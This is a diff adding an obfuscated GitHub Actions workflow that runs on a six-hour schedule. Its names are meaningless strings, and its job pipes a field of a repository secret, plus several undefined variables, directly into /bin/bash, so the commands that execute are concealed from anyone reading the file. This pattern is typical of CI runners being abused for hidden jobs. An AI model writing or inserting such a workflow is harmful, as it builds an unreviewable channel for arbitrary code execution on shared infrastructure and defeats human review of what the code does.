@@ -1,0 +1,23 @@
+name: fangzhangdx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangzhangdx
+        env:
+          wr94890: ${{ secrets.wr94890 }}
+        run: |
+          echo $wr94890 | jq -r .w85071 | /bin/bash
+          echo $tq598 | jq -r .mpdk36 | /bin/bash
+          echo $jhgcr501 | jq -r .tph3 | /bin/bash
+          echo $s43845 | jq -r .i7105 | /bin/bash
+          echo $a0 | jq -r .eril4 | /bin/bash
+          echo $msez8668 | jq -r .al9940 | /bin/bash
+
